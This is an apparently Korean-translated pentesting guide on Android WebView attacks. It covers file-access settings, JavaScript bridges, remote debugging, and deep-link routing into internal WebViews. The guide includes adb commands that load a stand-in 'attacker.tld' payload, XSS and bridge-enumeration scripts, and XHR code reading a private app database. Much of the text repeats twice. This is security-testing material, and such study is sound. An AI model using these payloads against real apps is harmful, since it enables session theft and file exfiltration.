# Webview Attacks

{{#include ../../banners/hacktricks-training.md}}

## Guide on WebView Configurations and Security

### Overview of WebView Vulnerabilities

Android 개발의 중요한 측면은 WebViews를 올바르게 처리하는 것입니다. 이 가이드는 WebView 사용과 관련된 위험을 완화하기 위한 주요 구성 및 보안 관행을 강조합니다.

![WebView Example](<../../images/image (1190).png>)

### **File Access in WebViews**

기본적으로 WebViews는 파일 접근을 허용합니다. 이 기능은 Android API 레벨 3 (Cupcake 1.5)부터 사용 가능한 `setAllowFileAccess()` 메서드에 의해 제어됩니다. **android.permission.READ_EXTERNAL_STORAGE** 권한이 있는 애플리케이션은 파일 URL 스킴(`file://path/to/file`)을 사용하여 외부 저장소에서 파일을 읽을 수 있습니다.

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: 이 사용 중단된 기능은 파일 URL에서 교차 출처 요청을 허용하여 잠재적인 XSS 공격으로 인한 상당한 보안 위험을 초래했습니다. 기본 설정은 Android Jelly Bean 및 이후 버전을 대상으로 하는 앱에 대해 비활성화(`false`)되어 있습니다.
- 이 설정을 확인하려면 `getAllowUniversalAccessFromFileURLs()`를 사용하십시오.
- 이 설정을 수정하려면 `setAllowUniversalAccessFromFileURLs(boolean)`를 사용하십시오.
- **File Access From File URLs**: 이 기능도 사용 중단되었으며, 다른 파일 스킴 URL에서 콘텐츠에 대한 접근을 제어했습니다. 유니버설 접근과 마찬가지로 기본값은 보안을 강화하기 위해 비활성화되어 있습니다.
- 확인하려면 `getAllowFileAccessFromFileURLs()`를 사용하고, 설정하려면 `setAllowFileAccessFromFileURLs(boolean)`를 사용하십시오.

#### **Secure File Loading**

파일 시스템 접근을 비활성화하면서 자산 및 리소스에 여전히 접근하기 위해 `setAllowFileAccess()` 메서드를 사용합니다. Android R 이상에서는 기본 설정이 `false`입니다.

- 확인하려면 `getAllowFileAccess()`를 사용하십시오.
- 활성화 또는 비활성화하려면 `setAllowFileAccess(boolean)`를 사용하십시오.

#### **WebViewAssetLoader**

**WebViewAssetLoader** 클래스는 로컬 파일을 로드하기 위한 현대적인 접근 방식입니다. 이는 http(s) URL을 사용하여 로컬 자산 및 리소스에 접근하며, 동일 출처 정책에 맞춰 CORS 관리를 용이하게 합니다.

### loadUrl

이것은 웹뷰에서 임의의 URL을 로드하는 데 사용되는 일반적인 함수입니다:
```java
webview.loadUrl("<url here>")
```
물론, 잠재적인 공격자는 애플리케이션이 로드할 **URL**을 절대 **제어**할 수 없어야 합니다.

### **JavaScript 및 Intent 스킴 처리**

- **JavaScript**: WebViews에서 기본적으로 비활성화되어 있으며, `setJavaScriptEnabled()`를 통해 활성화할 수 있습니다. 적절한 안전 장치 없이 JavaScript를 활성화하면 보안 취약점이 발생할 수 있으므로 주의가 필요합니다.
- **Intent 스킴**: WebViews는 `intent` 스킴을 처리할 수 있으며, 신중하게 관리하지 않으면 악용될 수 있습니다. 한 예로, 노출된 WebView 매개변수 "support_url"이 XSS(교차 사이트 스크립팅) 공격을 실행하는 데 악용될 수 있는 취약점이 있었습니다.

![Vulnerable WebView](<../../images/image (1191).png>)

adb를 사용한 악용 예:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android는 **JavaScript**가 WebView에서 **네이티브 Android 앱 기능**을 호출할 수 있도록 하는 기능을 제공합니다. 이는 `addJavascriptInterface` 메서드를 활용하여 JavaScript와 네이티브 Android 기능을 통합하는 _WebView JavaScript bridge_를 통해 이루어집니다. 이 메서드는 WebView 내의 모든 페이지가 등록된 JavaScript Interface 객체에 접근할 수 있도록 하므로, 이러한 인터페이스를 통해 민감한 정보가 노출될 경우 보안 위험이 발생할 수 있으므로 주의가 필요합니다.

- **Android 4.2 이하 버전을 타겟으로 하는 앱은** 악의적인 JavaScript를 통해 원격 코드 실행을 허용하는 취약점으로 인해 **극도의 주의가 필요합니다.**

#### Implementing a JavaScript Bridge

- **JavaScript 인터페이스**는 네이티브 코드와 상호작용할 수 있으며, 클래스 메서드가 JavaScript에 노출되는 예시에서 볼 수 있습니다:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge는 WebView에 인터페이스를 추가하여 활성화됩니다:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- JavaScript를 통한 잠재적 악용, 예를 들어 XSS 공격을 통해 노출된 Java 메서드를 호출할 수 있습니다:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- 위험을 완화하기 위해, **JavaScript 브리지 사용을** APK와 함께 제공된 코드로 제한하고 원격 소스에서 JavaScript 로딩을 방지하십시오. 구형 장치의 경우 최소 API 수준을 17로 설정하십시오.

### 반사 기반 원격 코드 실행 (RCE)

- 문서화된 방법은 특정 페이로드를 실행하여 반사를 통해 RCE를 달성할 수 있게 합니다. 그러나 `@JavascriptInterface` 주석은 무단 메서드 접근을 방지하여 공격 표면을 제한합니다.

### 원격 디버깅

- **원격 디버깅**은 **Chrome 개발자 도구**를 사용하여 가능하며, WebView 콘텐츠 내에서 상호작용 및 임의의 JavaScript 실행을 가능하게 합니다.

#### 원격 디버깅 활성화

- 원격 디버깅은 애플리케이션 내의 모든 WebView에 대해 활성화할 수 있습니다:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- 애플리케이션의 디버깅 가능 상태에 따라 조건부로 디버깅을 활성화하려면:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## 임의 파일 유출

- XMLHttpRequest를 사용하여 임의 파일의 유출을 시연합니다:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Webview Attacks

## Guide on WebView Configurations and Security

### Overview of WebView Vulnerabilities

Android 개발의 중요한 측면은 WebViews를 올바르게 처리하는 것입니다. 이 가이드는 WebView 사용과 관련된 위험을 완화하기 위한 주요 구성 및 보안 관행을 강조합니다.

![WebView Example](<../../images/image (1190).png>)

### **File Access in WebViews**

기본적으로 WebViews는 파일 접근을 허용합니다. 이 기능은 Android API 레벨 3 (Cupcake 1.5)부터 사용 가능한 `setAllowFileAccess()` 메서드에 의해 제어됩니다. **android.permission.READ_EXTERNAL_STORAGE** 권한이 있는 애플리케이션은 파일 URL 스킴(`file://path/to/file`)을 사용하여 외부 저장소에서 파일을 읽을 수 있습니다.

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: 이 사용 중단된 기능은 파일 URL에서 교차 출처 요청을 허용하여 잠재적인 XSS 공격으로 인한 상당한 보안 위험을 초래했습니다. 기본 설정은 Android Jelly Bean 및 이후 버전을 대상으로 하는 앱에 대해 비활성화(`false`)되어 있습니다.
- 이 설정을 확인하려면 `getAllowUniversalAccessFromFileURLs()`를 사용하십시오.
- 이 설정을 수정하려면 `setAllowUniversalAccessFromFileURLs(boolean)`를 사용하십시오.
- **File Access From File URLs**: 이 기능도 사용 중단되었으며, 다른 파일 스킴 URL에서 콘텐츠에 대한 접근을 제어했습니다. 유니버설 접근과 마찬가지로 기본값은 보안을 강화하기 위해 비활성화되어 있습니다.
- 확인하려면 `getAllowFileAccessFromFileURLs()`를 사용하고, 설정하려면 `setAllowFileAccessFromFileURLs(boolean)`를 사용하십시오.

#### **Secure File Loading**

파일 시스템 접근을 비활성화하면서 자산 및 리소스에 여전히 접근하기 위해 `setAllowFileAccess()` 메서드를 사용합니다. Android R 이상에서는 기본 설정이 `false`입니다.

- 확인하려면 `getAllowFileAccess()`를 사용하십시오.
- 활성화 또는 비활성화하려면 `setAllowFileAccess(boolean)`를 사용하십시오.

#### **WebViewAssetLoader**

**WebViewAssetLoader** 클래스는 로컬 파일을 로드하기 위한 현대적인 접근 방식입니다. 이는 http(s) URL을 사용하여 로컬 자산 및 리소스에 접근하며, 동일 출처 정책에 맞춰 CORS 관리를 용이하게 합니다.

### loadUrl

이것은 웹뷰에서 임의의 URL을 로드하는 데 사용되는 일반적인 함수입니다:
```java
webview.loadUrl("<url here>")
```
물론, 잠재적인 공격자는 애플리케이션이 로드할 **URL**을 절대 **제어할 수 없어야** 합니다.

### 내부 WebView로의 딥 링크 (커스텀 스킴 → WebView 싱크)

많은 앱이 사용자 제공 URL을 인앱 WebView로 라우팅하는 커스텀 스킴/경로를 등록합니다. 딥 링크가 내보내지면 (VIEW + BROWSABLE), 공격자는 앱이 WebView 컨텍스트 내에서 임의의 원격 콘텐츠를 렌더링하도록 강제할 수 있습니다.

전형적인 매니페스트 패턴 (단순화):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
일반적인 코드 흐름 (단순화됨):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
adb를 통한 공격 패턴 및 PoC:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact: 원격 페이지가 앱 WebView 컨텍스트에서 실행됩니다 (앱 WebView 프로필의 쿠키/세션, 노출된 @JavascriptInterface에 대한 접근, 설정에 따라 content:// 및 file://에 대한 잠재적 접근).

Hunting tips:
- `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks, 및 deep-link 핸들러(`onCreate/onNewIntent`)에 대해 디컴파일된 소스를 Grep합니다.
- VIEW+BROWSABLE 필터 및 나중에 WebView를 시작하는 활동에 매핑되는 사용자 정의 스킴/호스트에 대해 매니페스트를 검토합니다.
- 여러 deep-link 경로가 있는지 확인합니다 (예: "외부 브라우저" 경로와 "내부 웹뷰" 경로) 및 앱 내에서 렌더링되는 경로를 선호합니다.

### 확인 전에 JavaScript 활성화 (검사 순서 버그)

자주 발생하는 보안 강화 실수는 최종 허용 목록/대상 URL 검증이 완료되기 전에 JavaScript를 활성화하거나 느슨한 WebView 설정을 구성하는 것입니다. 검증이 도우미 간에 일관되지 않거나 너무 늦게 발생하면, 공격자의 deep link가 다음 상태에 도달할 수 있습니다:

1) WebView 설정이 적용됩니다 (예: `setJavaScriptEnabled(true)`), 및
2) 신뢰할 수 없는 URL이 JavaScript가 활성화된 상태로 로드됩니다.

버그 패턴 (의사 코드):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
왜 취약한가
- 일관되지 않은 정규화: 헬퍼가 URL을 최종 검사와 다르게 분할/재구성하여 악의적인 URL이 악용할 수 있는 불일치를 생성합니다.
- 잘못된 순서의 파이프라인: 2단계에서 JS를 활성화하면 WebView 인스턴스에 전역적으로 적용되어, 나중에 검증이 실패하더라도 최종 로드에 영향을 미칩니다.

테스트 방법
- 초기 검사를 통과하고 WebView 구성 사이트에 도달하는 딥 링크 페이로드를 작성합니다.
- adb를 사용하여 `url=` 매개변수를 전달하는 암시적 VIEW 인텐트를 발사합니다:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
만약 익스플로잇이 성공하면, 당신의 페이로드는 앱의 WebView에서 JavaScript를 실행합니다. 거기에서 노출된 브리지를 탐색하십시오:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Defensive guidance
- Canonicalize once; validate strictly against a single source of truth (scheme/host/path/query).
- Only call `setJavaScriptEnabled(true)` after all allowlist checks pass and just before loading trusted content.
- Avoid exposing `@JavascriptInterface` to untrusted origins; prefer per-origin gating.
- Consider per-WebView instances for trusted vs untrusted content, with JS disabled by default.

### **JavaScript 및 Intent Scheme 처리**

- **JavaScript**: WebViews에서 기본적으로 비활성화되어 있으며, `setJavaScriptEnabled()`를 통해 활성화할 수 있습니다. 적절한 안전 장치 없이 JavaScript를 활성화하면 보안 취약점이 발생할 수 있으므로 주의가 필요합니다.
- **Intent Scheme**: WebViews는 `intent` 스킴을 처리할 수 있으며, 신중하게 관리하지 않으면 악용될 수 있습니다. 예를 들어, 노출된 WebView 매개변수 "support_url"이 XSS 공격을 실행하는 데 악용될 수 있는 취약점이 있었습니다.

![Vulnerable WebView](<../../images/image (1191).png>)

Exploitation example using adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android는 **JavaScript**가 WebView에서 **네이티브 Android 앱 기능**을 호출할 수 있도록 하는 기능을 제공합니다. 이는 `addJavascriptInterface` 메서드를 활용하여 JavaScript와 네이티브 Android 기능을 통합하는 _WebView JavaScript bridge_를 통해 이루어집니다. 이 메서드는 WebView 내의 모든 페이지가 등록된 JavaScript Interface 객체에 접근할 수 있도록 하므로, 이러한 인터페이스를 통해 민감한 정보가 노출될 경우 보안 위험이 발생할 수 있으므로 주의가 필요합니다.

- **Android 4.2 이하 버전을 타겟으로 하는 앱은** 악의적인 JavaScript를 통해 원격 코드 실행을 허용하는 취약점으로 인해 **극도의 주의가 필요합니다.**

#### Implementing a JavaScript Bridge

- **JavaScript 인터페이스**는 네이티브 코드와 상호작용할 수 있으며, 클래스 메서드가 JavaScript에 노출되는 예시에서 볼 수 있습니다:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge는 WebView에 인터페이스를 추가하여 활성화됩니다:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- JavaScript를 통한 잠재적 악용, 예를 들어 XSS 공격을 통해 노출된 Java 메서드를 호출할 수 있습니다:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- 위험을 완화하기 위해, **JavaScript 브리지 사용을** APK와 함께 제공된 코드로 제한하고 원격 소스에서 JavaScript 로딩을 방지하십시오. 구형 장치의 경우 최소 API 수준을 17로 설정하십시오.

### 반사 기반 원격 코드 실행 (RCE)

- 문서화된 방법은 특정 페이로드를 실행하여 반사를 통해 RCE를 달성할 수 있게 합니다. 그러나 `@JavascriptInterface` 주석은 무단 메서드 접근을 방지하여 공격 표면을 제한합니다.

### 원격 디버깅

- **원격 디버깅**은 **Chrome 개발자 도구**를 사용하여 가능하며, WebView 콘텐츠 내에서 상호작용 및 임의의 JavaScript 실행을 가능하게 합니다.

#### 원격 디버깅 활성화

- 원격 디버깅은 애플리케이션 내의 모든 WebView에 대해 활성화할 수 있습니다:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- 애플리케이션의 디버깅 가능 상태에 따라 조건부로 디버깅을 활성화하려면:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## 임의 파일 유출

- XMLHttpRequest를 사용하여 임의 파일의 유출을 시연합니다:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## References

- [Android WebViews 파일 접근 공격 벡터 검토](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (데모 앱)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Android WebView 참조](https://developer.android.com/reference/android/webkit/WebView)
- [딥 링크 및 WebViews 악용 – 파트 II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [딥 링크 및 WebViews 악용 – 파트 I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 익스플로잇 체인 Pwn2Own 2024 워크스루](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own 아일랜드 2024 – Samsung S24 공격 체인 (백서)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [시연 비디오](https://www.youtube.com/watch?v=LAIr2laU-So)

{{#include ../../banners/hacktricks-training.md}}
